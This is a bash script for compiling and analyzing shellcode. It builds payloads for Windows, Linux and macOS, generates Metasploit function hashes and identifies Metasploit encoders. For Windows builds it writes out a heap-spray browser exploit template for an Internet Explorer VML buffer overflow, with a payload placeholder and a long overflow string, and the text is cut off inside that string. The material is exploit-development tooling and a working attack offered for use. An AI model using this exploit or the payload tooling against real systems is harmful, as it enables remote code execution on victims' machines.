#!/bin/bash

VERSION=4.00
AUTHOR="Ty Miller"
WEBSITE="www.threatintelligence.com"

MSF3=/pentest/exploits/framework3
msf3found=`ls -1d $MSF3 2>&1 | grep -c "^$MSF3$"`

if [ "$1" == "version" ]
then
	printf "\n$0\n\nVersion: $VERSION\n\n"
	echo $AUTHOR
	echo $WEBSITE
	exit
fi

function usage()
{

	printf "\n\tVersion: $VERSION\n"
	printf "\tAuthor: $AUTHOR\n"
	printf "\tWebsite: $WEBSITE\n"
	printf "\n\tUsage: $0 {compilation-format} filename.asm\n"
	printf "\n\tUsage: $0 --hash {library.dll} {function1 function2 ...}\n"
	printf "\n\tUsage: $0 --disassemble-macho64 osxshellcode.macho64\n"
	printf "\n\tUsage: $0 --analyze shellcodefile\n"
	printf "\n"
	printf "\tCompilation Formats:\n"
	printf "\t\tbin:\t\tCreate shellcode for Windows (binary executable)[default]\n"
	printf "\t\twin64:\t\tCreate shellcode for 64-bit Windows (binary executable)\n"
	printf "\t\telf:\t\tCreate shellcode for Linux (elf executable)\n"
	printf "\t\telf64:\t\tCreate shellcode for 64-bit Linux (64-bit elf executable)\n"
	printf "\t\tmacho64:\tCreate shellcode for 64-bit Mac OSX (support on Darwin only)\n"
	printf "\n"
	printf "\tHash generation:\n"
	printf "\t\t--hash:\tGenerate Metasploit function hashes for a library\n"
	printf "\t\t\t(Requires Metasploit to be accessible via $MSF3 ... "
	if [ $msf3found -eq 1 ]
	then
		printf "Yours seems to be)\n"
	else
		printf "Yours does not seem to be)\n"
	fi
	printf "\n"
	printf "\tMac OS X macho64 disassembly:\n"
	printf "\t\t--disassemble-macho64:\tDisassemble macho64 binary showing opcodes and instructions\n"
	printf "\n"
	printf "\tShellcode Analyzer:\n"
	printf "\t\t--analyze:\tDetect shellcode format (can be raw binary, escaped (\\\xXX) or unicode (%uXXYY),\n"
	printf "\t\t\tcreate ASM file, compile to elf, disassemble, search for strings in binary\n"
	printf "\n"
	printf "\tExamples:\n"
	printf "\t\t$0 shellcode.asm\n"
	printf "\t\t$0 win64 shellcode.asm\n"
	printf "\t\t$0 elf shellcode.asm\n"
	printf "\t\t$0 elf64 shellcode.asm\n"
	printf "\t\t$0 macho64 shellcode.asm\n"
	printf "\t\t$0 --hash kernel32.dll LoadLibraryA WinExec ExitProcess\n"
	printf "\t\t$0 --disassemble-macho64 osxshellcode.macho64\n"
	printf "\t\t$0 --analyze unicode-shellcodefile\n"
	printf "\n"
}

function shellcode_size
{
	file=$1
	if [ -f "$file" ]
	then
		size=`printf \`cat $file | sed s/x/n/g\` | grep -c .`
		printf "$size"
	else
		printf "\nERROR: $file does not exist. Cannot calculate shellcode size.\n\n"
	fi
}

function analyze_shellcode
{
	filename=$1
	format=""
	outputchars=50
	
	if [ ! -f $filename ]
	then
		printf "\n\tError: File $filename does not exist.\n\n"
		exit
	fi
	
	findxxd=`which xxd 2>&1 | grep -c "/xxd"`
	if [ $findxxd -eq 0 ]
	then
		printf "\n\tWARNING: xxd not found. This will break some functionality.\n\n"
	fi
	
	findgcc=`which gcc 2>&1 | grep -c "/gcc"`
	if [ $findgcc -eq 0 ]
	then
		printf "\n\tWARNING: gcc not found. This will break some functionality.\n\n"
	fi
		
	findobjdump=`which objdump 2>&1 | grep -c "/objdump"`
	if [ $findobjdump -eq 0 ]
	then
		printf "\n\tWARNING: objdump not found. This will break some functionality.\n\n"
	fi

	printf "\n"
	
	isunicode=`cat $filename | grep -c "%u"`
	if [ $isunicode -ne 0 ]
	then
		format="unicode"
		printf "%-${outputchars}s" "Detected shellcode format $format"
		printf "%-${outputchars}s\n" "[cat $filename | grep -c \"%u\"]"
		cat $filename | grep "%u" | sed s/'["_.&()+=; ]'//g | sed s/"'"//g | while read line; do echo -n "$line"; done > $filename.unicode
	fi
	
	isurl=`cat $filename | grep -v "%u" | grep -c "%"`
	if [ $isurl -ne 0 ]
	then
		format="url encoding"
		printf "%-${outputchars}s" "Detected shellcode format $format"
		printf "%-${outputchars}s\n" "[cat $filename | grep -v \"%u\" | grep -c \"%\"]"
		cat $filename | grep "%" | sed s/'["_.&()+=; ]'//g | sed s/"'"//g | sed s/".*unescape"// | while read line; do echo -n "$line"; done > $filename.url
	fi
	
	isescaped=`cat $filename | grep -c '\\\x'`
	if [ $isescaped -ne 0 ]
	then
		format="escaped"
		printf "%-${outputchars}s" "Detected shellcode format $format"
		printf "%-${outputchars}s\n" "[cat $filename | grep -c '\\\x']"
		cat $filename | grep "\\x" | sed s/'["_&()+=; ]'//g | sed s/"'"//g | sed s/"\\x"/"\\\\x"/g | while read line; do echo -n "$line"; done > $filename.shellcode
	fi
	
	# else assume raw
	if [ "$format" == "" ]
	then
		format="raw"
		printf "%-${outputchars}s" "Detected shellcode format $format"
		printf "%-${outputchars}s\n" "[Assumed raw format since not unicode or escaped]"
		cp $filename $filename.raw
	fi
	
	# Convert unicode to escaped format
	if [ "$format" == "unicode" ]
	then
	
		printf "%-${outputchars}s" "Converting $format to escaped"
		printf "%-${outputchars}s\n" "[$filename.shellcode]"
		rm -f $filename.shellcode
		cat $filename.unicode | sed s/"%u"/"\n"/g | while read line
		do
			one=`echo $line | cut -c1-2`
			two=`echo $line | cut -c3-4`
			if [ "$two" != "" ]
			then
				echo -n "\\x$two" >> $filename.shellcode
			fi
			if [ "$one" != "" ]
			then
				echo -n "\\x$one" >> $filename.shellcode
			fi
		done
	
	fi
	
	# Convert url encoding to escaped format
	if [ "$format" == "url encoding" ]
	then
		printf "%-${outputchars}s" "Converting $format to escaped"
		printf "%-${outputchars}s\n" "[$filename.shellcode]"
		rm -f $filename.shellcode
	
		# create escaped file from url
		cat $filename.url | sed s/"%"/"\\\\x"/g > $filename.shellcode
	fi
	
	# Convert raw to escaped format
	if [ "$format" == "raw" ]
	then
		printf "%-${outputchars}s" "Converting $format to escaped"
		printf "%-${outputchars}s\n" "[$filename.shellcode]"
		rm -f $filename.shellcode
	
		# create escaped file from raw
		xxd -i $filename.raw | grep , | sed s/" "//g | while read line; do echo -n $line; done | sed s/","//g | sed s/"0x"/"\\\\x"/g > $filename.shellcode
	fi
	
	
	printf "%-${outputchars}s" "Converting escaped shellcode to ASM"
	printf "%-${outputchars}s\n" "[$filename.asm]"

	if [ -f $filename.asm ]
	then
		printf "\n\tERROR:\t$filename.asm already exists. Didn't want to overwrite your code.\n"
		printf "\t\tIf you want to clear previous analysis files type \"rm $filename\.*\"\n"
		printf "\t\tExiting.\n\n"
		exit
	fi
	printf "[SECTION .text]\n" >> $filename.asm
	printf "BITS 32\n" >> $filename.asm
	printf "global _start\n" >> $filename.asm
	printf "_start:\n\n" >> $filename.asm
	printf "db " >> $filename.asm
	cat $filename.shellcode | sed s/"\\\x"/",0x"/g | sed s/"^,"// >> $filename.asm
	printf "\n\n" >> $filename.asm
	
	
	printf "%-${outputchars}s" "Compiling ASM file to various formats"
	printf "%-${outputchars}s\n" "[shellcode-compiler.sh elf $filename.asm]"
	
	shellcode-compiler.sh elf $filename.asm
	
	
	printf "%-${outputchars}s" "Disassembling elf file to objdump file"
	printf "%-${outputchars}s\n" "[objdump -d $filename.elf]"
	
	objdump -d $filename.elf > $filename.objdump


	printf "%-${outputchars}s" "Detecting raw shellcode file type"
	printf "%-${outputchars}s\n" "[`file $filename.raw | sed s/"$filename.raw: "//`]"
	
	
	printf "%-${outputchars}s" "Detecting shellcode encoder"
	shikataganai="\\\xd9\\\x74\\\x24\\\xf4"
	alphanum="\\\x49\\\x49\\\x49\\\x49"
	fnstenvsub="\\\xc9\\\x83\\\xe9"
	if [ `cat $filename.shellcode | grep -c "$shikataganai"` -ne 0 ]
	then
		encoder="Metasploit Shikata Ga Nai"
	elif [ `cat $filename.shellcode | grep -c "$alphanum"` -ne 0 ]
	then
		encoder="Metasploit PexAlphaNum or Alpha2"
	fi
	if [ `cat $filename.shellcode | grep -c "^....$fnstenvsub"` -ne 0 ]
	then
		encoder="Metasploit PexFnstenvSub $encoder"
	fi
	if [ "$encoder" == "" ]
	then
		encoder="Unknown Encoder"
	fi
	printf "%-${outputchars}s\n" "[$encoder]"
	
	
	printf "%-${outputchars}s" "Searching elf file for strings"
	printf "%-${outputchars}s\n\n" "[strings $filename.elf]"
	
	strings $filename.elf
	
	printf "\nShellcode files created:\n\n"
	
	ls -1d $filename\.*
	
	printf "\n"
}
	
if [ $# -eq 1 ]
then
	format=bin
	GCC=i586-mingw32msvc-gcc
	origfilename=$1
	filename=`echo $1 | sed s/".asm$"//`
elif [ $# -eq 2 ]
then
	format=$1
	GCC=gcc
	origfilename=$2
	filename=`echo $2 | sed s/".asm$"//`
elif [ $# -ge 3 ]
then
	format=$1
else
	usage
	exit
fi

platform=`uname`

if [ "$format" == "--analyze" -o "$format" == "--analyse" ]
then
	analyze_shellcode $origfilename
	exit
fi

if [ "$format" == "--disassemble-macho64" ]
then
	#start=-1
	#end=-1
	column1=20
	column2=36
	prevlabel=""
	echo "$origfilename:"
	otool -tv $origfilename | while read line
	do
		code=`echo $line | egrep -c "^0"`
		if [ $code -eq 0 ]
		then
			prevlabel=$line
			continue
		fi
	
		hex=`echo $line | awk '{print $1}'`
		num=`printf "%d\n" 0x$hex`

		#if [ "$start" == "-1" ]
		if [ "$start" == "" ]
		then
			let "start=$num+1"
		else
			end=$num
			let "prev=$start-1"
			linenum=`printf "%016x" $prev`
			opcodes=`for i in \`otool -t $origfilename | egrep -v "section|:" | cut -d" " -f2-17\`; do printf "$i "; done | cut -d" " -f$start-$end`
			instructions=`otool -tv $origfilename | grep "^$linenum" | sed s/"^$linenum."//`
			printf "%-${column1}s" "$linenum"
			printf "%-${column2}s" "$opcodes"
			printf "%s\n" "$instructions"
			let "start=$end+1"
		fi

		if [ "$prevlabel" != "" ]
		then
			echo "$prevlabel"
			prevlabel=""
		fi
	
	done

	hex=`otool -tv $origfilename | tail -1 | awk '{print $1}'`
	num=`printf "%d\n" 0x$hex`
	let "start=num+1"
	linenum=$hex
	opcodes=`for i in \`otool -t $origfilename | egrep -v "section|:" | cut -d" " -f2-17\`; do printf "$i "; done | cut -d" " -f$start-`
	instructions=`otool -tv $origfilename | grep "^$linenum" | sed s/"^$linenum."//`
	printf "%-${column1}s" "$linenum"
	printf "%-${column2}s" "$opcodes"
	printf "%s\n" "$instructions"

	exit
fi

if [ "$format" == "--hash" ]
then
	command=python
	result=`which $command 2>&1 | grep -v "no $command" | grep .`
	if [ "$result" == "" ]
	then
		printf "\n\tERROR: $command not found in PATH. Exiting.\n"
		exit
	fi

	command=$MSF3/external/source/shellcode/windows/x86/src/hash.py
	result=`ls $MSF3/external/source/shellcode/windows/x86/src/hash.py 2>&1 | grep -c "^ls:"`
	if [ $result != 0 ]
	then
		printf "\n\tERROR: $command not found.\nChange MSF3 location in $0\nExiting.\n"
		exit
	fi

	library=$2
	shift
	shift
	functions=$*
	for function in $functions
	do
		python $command $library $function | tail -1
	done
	exit
fi


asmfilecount=`echo $origfilename | grep -c ".asm$"`
if [ $asmfilecount -eq 0 ]
then
	printf "\n\tERROR: filename requires a .asm file as input\n"
	usage
	exit
fi

command=nasm
result=`which $command 2>&1 | grep -v "no $command" | grep .`
if [ "$result" == "" ]
then
	printf "\n\tERROR: $command not found in PATH. Exiting.\n"
	exit
else
	if [ "$format" == "macho64" ]
	then
		# check macho64 support in nasm version
		m64support=`nasm -hf | grep -c "macho64"`
		if [ $m64support -eq 0 ]
		then
			# check if another version exists in /usr/local/bin
			m64support=`/usr/local/bin/nasm -hf | grep -c "macho64"`
			if [ $m64support -eq 0 ]
			then
				printf "\n\tERROR: `which nasm` and /usr/local/bin/nasm does not support macho64 format. Exiting.\n\n"
				exit
			else
				printf "\nWARNING: `which nasm` does not support macho64 format. Using /usr/local/bin/nasm.\n"
				NASM="/usr/local/bin/nasm"
			fi
		else
			NASM="nasm"
		fi
	else
		NASM="nasm"
	fi
fi

command=$GCC
result=`which $command 2>&1 | grep -v "no $command" | grep .`
if [ "$result" == "" ]
then
	printf "\nWARNING: $command not found in PATH. $filename.shellcodetest.c compile will fail. Not exiting since you may not care.\n"
fi

command=msfvenom
result=`which $command 2>&1 | grep -v "no $command" | grep .`
if [ "$result" == "" ]
then
	if [ "$format" == "win64" ]
	then
		printf "\nWARNING: $command not found in PATH. $filename.shellcodetest.exe generation will fail for x64 Windows. Not exiting since you may not care.\n"
	fi
fi

command=objdump
result=`which $command 2>&1 | grep -v "no $command" | grep .`
if [ "$result" == "" ]
then
	if [ "$platform" == "Linux" ]
	then
		printf "\nWARNING: $command not found in PATH. Stripping shellcode from object file will fail for Linux. Not exiting since you may not care.\n"
	fi
fi

command=xxd
result=`which $command 2>&1 | grep -v "no $command" | grep .`
if [ "$result" == "" ]
then
	printf "\nWARNING: $command not found in PATH. Stripping shellcode from object file will fail for Windows. Not exiting since you may not care.\n"
fi

command=otool
result=`which $command`
if [ "$result" == "" ]
then
	if [ "$platform" == "Darwin" ]
	then
		printf "\nWARNING: $command not found in PATH. Stripping shellcode from object file will fail for Mac OSX. Not exiting since you may not care.\n"
	fi
fi


outputchars=50
currentdir=`pwd`
cd $currentdir

rm -f $filename.bin
rm -f $filename.win64
rm -f $filename.raw
rm -f $filename.elf
rm -f $filename.elf64
rm -f $filename.macho64
rm -f $filename.shellcode
rm -f $filename.shellcodetest.c
rm -f $filename.shellcodetest.exe
rm -f $filename.shellcodetest
rm -f $filename.ms07-004.html


echo
if [ "$format" == "win64" ]
then
	saveformat=$format
	format=bin
fi
printf "%-${outputchars}s" "Compiling assembly"
printf "%-${outputchars}s\n" "[$NASM -f $format -o $filename.$format $filename.asm]"
$NASM -o $filename.$format -f $format $filename.asm
if [ "$saveformat" == "win64" ]
then
	format=$saveformat
fi

printf "%-${outputchars}s" "Extracting shellcode"

if [ "$format" == "bin" ]
then
	GCC=i586-mingw32msvc-gcc
	extension=".exe"
	printf "%-${outputchars}s\n" "[xxd -i $filename.$format ... then parsed to $filename.shellcode]"
	for i in `xxd -i $filename.$format | grep -v '\;' | grep -v unsigned | sed s/" "/" "/ | sed s/","/""/g | sed s/"0x"/"\\\\x"/g`
	do
	    echo -n "\\$i" >> $filename.shellcode
	done
elif [ "$format" == "win64" ]
then
	GCC=msfvenom
	extension=".exe"
	printf "%-${outputchars}s\n" "[xxd -i $filename.bin ... then parsed to $filename.shellcode]"
	for i in `xxd -i $filename.bin | grep -v '\;' | grep -v unsigned | sed s/" "/" "/ | sed s/","/""/g | sed s/"0x"/"\\\\x"/g`
	do
	    echo -n "\\$i" >> $filename.shellcode
	done
elif [ "$format" == "elf" -o "$format" == "elf64" ]
then
	GCC=gcc
	extension=""
	printf "%-${outputchars}s\n" "[objdump -d $filename.$format ... then parsed to $filename.shellcode]"
	objdump -d $filename.$format | sed s/".*:\t"// | sed s/"\t.*"// | grep -v ":" | grep . | while read line
	do
		echo -n " $line" | sed s/" "/"\\\x"/g >> $filename.shellcode
	done
elif [ "$format" == "macho64" ]
then
	GCC=gcc
	extension=""
	#ld -arch x86_64 -o $filename.$format.ld $filename.$format
	printf "%-${outputchars}s\n" "[otool -t $filename.$format ... then parsed to $filename.shellcode]"
	otool -t $filename.$format | egrep -v "section|:" | cut -d" " -f2-17 | while read line
	do
		echo -n " $line" | sed 's/ /\\\\x/g'
	done | while read shellcode; do echo -n "$shellcode" >> $filename.shellcode; done
else
	printf "\n\tERROR: Unknown format $format\n"
	usage
	exit
fi


printf "%-${outputchars}s" "Converting shellcode to raw binary"
printf "%-${outputchars}s\n" "[$filename.raw]"

printf "`cat $filename.shellcode`" > $filename.raw


printf "%-${outputchars}s" "Encoding shellcode as unicode"
printf "%-${outputchars}s\n" "[$filename.unicode]"

i=1
counter=0
for x in `cat $filename.shellcode | sed s/"\\\\\x"/" "/g`
do
        if [ $i -eq 1 ]
        then
                one=$x
                let "i=$i+1"
        else
                two=$x
                echo "%u${two}${one}" >> $filename.unicode.tmp
                i=1
        fi
        let "counter=$counter+1"
done

let "counter=$counter%2"
if [ $counter -eq 1 ]
then
        for x in `cat $filename.shellcode | sed s/"\\\\\x"/" "/g`
        do
                lastcode=$x
        done
        echo "%u90${lastcode}" >> $filename.unicode.tmp
fi

unicode=""
cat $filename.unicode.tmp | while read line
do
        echo -n $line >> $filename.unicode
done

rm -f $filename.unicode.tmp


if [ "$format" == "bin" ]
then

template=$filename.ms07-004.html
printf "%-${outputchars}s" "Creating Windows exploit test template"
printf "%-${outputchars}s\n" "[$template]"

rm -f $template
rm -f $template.tmp

cat << EOF >> $template.tmp
<!--

..::[ jamikazu presents ]::..

Microsoft Internet Explorer VML Remote Buffer Overflow Exploit (0day)
Works on all Windows XP versions including SP2

Author: jamikazu 
Mail: jamikazu@gmail.com

Credit: metasploit, SkyLined

invokes calc.exe if successful 


-->

<html xmlns:v="urn:schemas-microsoft-com:vml">

<head>
<object id="VMLRender" classid="CLSID:10072CEC-8CC1-11D1-986E-00A0C955B42E">
</object>
<style>
v\:* { behavior: url(#VMLRender); }
</style>
</head>

<body>

<SCRIPT language="javascript">

	var heapSprayToAddress = 0x05050505;

	var payLoadCode = unescape("insertpayloadhere");

	var heapBlockSize = 0x400000;

	var payLoadSize = payLoadCode.length * 2;

	var spraySlideSize = heapBlockSize - (payLoadSize+0x38);

	var spraySlide = unescape("%u9090%u9090");
	spraySlide = getSpraySlide(spraySlide,spraySlideSize);

	heapBlocks = (heapSprayToAddress - 0x400000)/heapBlockSize;

	memory = new Array();

	for (i=0;i<heapBlocks;i++)
	{
		memory[i] = spraySlide + payLoadCode;
	}



	function getSpraySlide(spraySlide, spraySlideSize)
	{
		while (spraySlide.length*2<spraySlideSize)
		{
			spraySlide += spraySlide;
		}
		spraySlide = spraySlide.substring(0,spraySlideSize/2);
		return spraySlide;
	}

</script>                                                                                                                                                            
<v:rect style='width:120pt;height:80pt' fillcolor="red">
<v:fill method  = "&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06C